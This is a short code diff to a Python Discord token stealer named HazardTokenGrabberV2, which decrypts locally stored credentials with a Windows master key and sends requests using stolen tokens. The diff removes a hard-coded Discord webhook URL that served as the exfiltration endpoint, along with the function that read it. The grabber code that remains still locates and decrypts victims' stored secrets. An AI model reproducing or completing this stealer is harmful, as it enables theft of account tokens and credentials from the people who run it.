@@ -10,11 +10,6 @@ from Crypto.Cipher import AES
 from win32crypt import CryptUnprotectData
 
 
-__config__ = {
-    'webhook': "https://discord.com/api/webhooks/1004927762978574406/cQyE2w8UqTN9QgCs56DexoImvto-IcmZX_dtuUqvAo_ONLzduzDeQQCaj1gAoh-zwfO3",  # Place your webhook here
-}
-
-
 class Functions(object):
     @staticmethod
     def get_master_key(path: str or os.PathLike):
@@ -55,14 +50,9 @@ class Functions(object):
             headers.update({"Authorization": token})
         return headers
 
-    @staticmethod
-    def fetch_conf(e: str) -> str or bool | None:
-        return __config__.get(e)
-
 
 class HazardTokenGrabberV2(Functions):
     def __init__(self):
-        self.webhook = self.fetch_conf('webhook')
         self.discordApi = "https://discord.com/api/v9/users/@me"
         self.appdata = os.getenv("localappdata")
         self.roaming = os.getenv("appdata")
